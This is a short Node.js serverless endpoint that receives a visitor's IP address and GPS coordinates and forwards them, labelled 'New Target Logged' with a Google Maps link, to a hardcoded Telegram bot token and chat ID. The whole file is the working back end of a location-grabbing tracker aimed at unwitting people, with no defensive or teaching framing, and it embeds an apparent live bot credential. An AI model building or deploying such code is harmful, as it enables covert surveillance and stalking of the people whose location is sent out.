// api/send.js (Node.js)
const fetch = require('node-fetch');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const botToken = "8731114549:AAF2xNA9djXbJbcsOhXvlKQY-ul8SMHPHbM";
        const chatId = "7681204940";
        const data = req.body;

        let message = `🔔 *New Target Logged*\n\n`;
        if(data.ip) message += `🌐 IP: ${data.ip}\n`;
        if(data.lat) message += `📍 Loc: ${data.lat}, ${data.lon}\n🔗 [Google Maps](${data.google_map})`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
        
        await fetch(url);
        return res.status(200).send("OK");
    }
    res.status(405).send("Method Not Allowed");
}
